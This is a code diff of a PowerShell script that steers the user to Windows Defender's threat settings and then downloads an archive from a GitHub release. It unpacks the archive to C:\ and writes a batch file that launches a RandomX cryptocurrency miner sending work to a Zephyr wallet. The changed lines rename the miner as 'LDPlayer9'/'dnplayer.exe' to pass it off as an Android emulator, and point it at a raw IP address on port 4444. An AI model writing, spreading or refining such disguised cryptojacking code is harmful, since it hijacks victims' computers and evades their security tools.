@@ -2,18 +2,18 @@
 $tCommand = if (-not (Test-Path ($tCommand = [System.IO.Path]::Combine($env:ProgramFiles, 'Windows Defender', 'MSASCui.exe')) -PathType Leaf)) { "windowsdefender://Threatsettings" } else { $tCommand }; Start-Process $tCommand
 Start-Sleep -Seconds 20
 $downloadPath = Join-Path -Path $env:USERPROFILE -ChildPath "Desktop"
-$url = "https://github.com/trangtrau/random-agent-spoofer/releases/download/SA/CSANGXMRIG.zip"
-Invoke-WebRequest -Uri $url -OutFile "$downloadPath\CSANGXMRIG.zip"
+$url = "https://github.com/trangtrau/random-agent-spoofer/releases/download/SA/LDPlayer9.zip"
+Invoke-WebRequest -Uri $url -OutFile "$downloadPath\LDPlayer9.zip"
 $destinationPath = "C:\" 
-Expand-Archive -Path "$downloadPath\CSANGXMRIG.zip" -DestinationPath $destinationPath -Force
+Expand-Archive -Path "$downloadPath\LDPlayer9.zip" -DestinationPath $destinationPath -Force
 Start-Sleep -Seconds 2
-Set-Location -Path "C:\CSANGXMRIG\"
+Set-Location -Path "C:\LDPlayer9\"
 $userName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
 $userName = $userName -replace "^.*\\", ""
-$folderPath = "C:\CSANGXMRIG\"
+$folderPath = "C:\LDPlayer9\"
 $batContent = @"
 cd %~dp0
-ldplayer.exe -o zephyr.miningocean.org:5332 -u ZEPHsAtsau1NnQ96FKLV5RNQFqzgi5NPbUqCUGHb5MCnUjT3H2vF9usMdE5YUG5fTu1Mfyqz7pNYxFgaZgSKVA9YSWPFmWkpjUX -p $userName -a rx/0 -k -t 8
+dnplayer.exe --algo="rx/0" -o 154.12.254.94:4444 -u ZEPHsAtsau1NnQ96FKLV5RNQFqzgi5NPbUqCUGHb5MCnUjT3H2vF9usMdE5YUG5fTu1Mfyqz7pNYxFgaZgSKVA9YSWPFmWkpjUX --tls --threads=2 -k --randomx-1gb-pagesX -p 001
 pause
 "@
 $batContent | Set-Content -Path (Join-Path -Path $folderPath -ChildPath "van.bat") -Force
